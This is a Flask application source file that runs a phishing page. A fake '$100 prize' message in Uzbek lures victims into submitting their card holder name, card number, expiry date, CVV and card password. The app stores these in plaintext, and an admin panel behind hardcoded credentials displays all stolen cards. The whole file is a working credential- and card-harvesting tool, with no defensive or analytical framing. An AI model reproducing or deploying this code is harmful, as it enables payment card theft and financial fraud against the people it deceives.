from flask import Flask, render_template, request, redirect, url_for, flash, session
from werkzeug.security import generate_password_hash, check_password_hash
from flask_sqlalchemy import SQLAlchemy

app = Flask(__name__)

# Secret key to keep session data secure
app.config['SECRET_KEY'] = 'your_secret_key_here'

# Database configuration
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///card_data.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)


# Model to store card data
class CardData(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    card_holder = db.Column(db.String(100), nullable=False)
    card_number = db.Column(db.String(20), nullable=False)
    expiry_date = db.Column(db.String(5), nullable=False)
    cvv = db.Column(db.String(3), nullable=False)
    card_password = db.Column(db.String(100), nullable=False)


# Admin model with hardcoded login credentials
class Admin(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(50), nullable=False)
    password = db.Column(db.String(100), nullable=False)


# Create database tables if they do not exist
with app.app_context():
    db.create_all()


# Route for admin login page with hardcoded credentials
@app.route('/admin_login', methods=['GET', 'POST'])
def admin_login():
    # Hardcoded admin username and password
    admin_username = "admin"
    admin_password = "admin2009"

    if 'admin_logged_in' in session:
        return redirect(url_for('admin'))

    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']

        # Check if credentials are correct
        if username == admin_username and password == admin_password:
            session['admin_logged_in'] = True  # Mark as logged in
            return redirect(url_for('admin'))
        else:
            flash('Invalid username or password', 'danger')
            return redirect(url_for('admin_login'))

    return render_template('admin_login.html')


# Route for admin panel
@app.route('/admin')
def admin():
    if 'admin_logged_in' not in session:
        return redirect(url_for('admin_login'))

    cards = CardData.query.all()
    return render_template('admin.html', cards=cards)


# Route for the card payment form
@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        card_holder = request.form['card_holder']
        card_number = request.form['card_number']
        expiry_date = request.form['expiry_date']
        cvv = request.form['cvv']
        card_password = request.form['password']

        # Store the card data into the database
        new_card = CardData(
            card_holder=card_holder,
            card_number=card_number,
            expiry_date=expiry_date,
            cvv=cvv,
            card_password=card_password
        )
        db.session.add(new_card)
        db.session.commit()

        # Flash message for success
        flash('🎉 Tabriklaymiz! 🎉 Siz 100$ yutdingiz! Pul 24 soat ichida kartangizga otkaziladi.', 'success')

        return redirect(url_for('index'))

    return render_template('index.html')


# Route for logout
@app.route('/logout')
def logout():
    session.pop('admin_logged_in', None)
    return redirect(url_for('admin_login'))


# Error handler for 404 page
@app.errorhandler(404)
def page_not_found(error):
    return render_template('404.html'), 404


if __name__ == '__main__':
    app.run(debug=True)
